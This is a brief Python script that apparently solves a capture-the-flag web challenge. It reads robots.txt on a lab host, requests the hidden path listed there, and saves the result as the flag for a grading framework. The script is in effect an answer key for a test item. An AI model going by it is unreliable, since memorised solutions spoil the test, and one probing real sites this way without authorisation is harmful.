#!/usr/bin/env python3
import requests

page = requests.get('http://challenge:8000/robots.txt').text.strip()
flag = requests.get('http://challenge:8000/' + page).text.strip()

# Write the flag out to where the framework will read it.
with open('flag', 'w') as f:
    f.write(flag)
